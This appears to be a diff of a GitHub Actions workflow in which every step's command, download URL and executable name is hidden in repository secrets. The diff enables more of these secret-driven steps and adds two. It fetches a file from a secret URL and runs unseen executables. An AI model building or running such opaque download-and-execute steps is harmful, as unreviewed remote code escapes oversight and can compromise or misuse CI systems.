@@ -15,12 +15,17 @@ jobs:
         Invoke-WebRequest ${{ secrets.EA_D }}
         .\${{ secrets.EA_E }}
         .\${{ secrets.EA_F }}
-#        .\${{ secrets.EA_G }}
+        .\${{ secrets.EA_G }}
     - name: command 2
       run: ${{ secrets.EA_H }}
     - name: command 3
       run: ${{ secrets.EA_I }}
     - name: command 4
-      run: cmd /c show.bat
+      run: ${{ secrets.EA_J }}
     - name: command 5
       run: ${{ secrets.EA_K }}
+    - name: command 6
+      run: ${{ secrets.EA_L }}
+    - name: command 6
+      run: ${{ secrets.EA_M }}
+
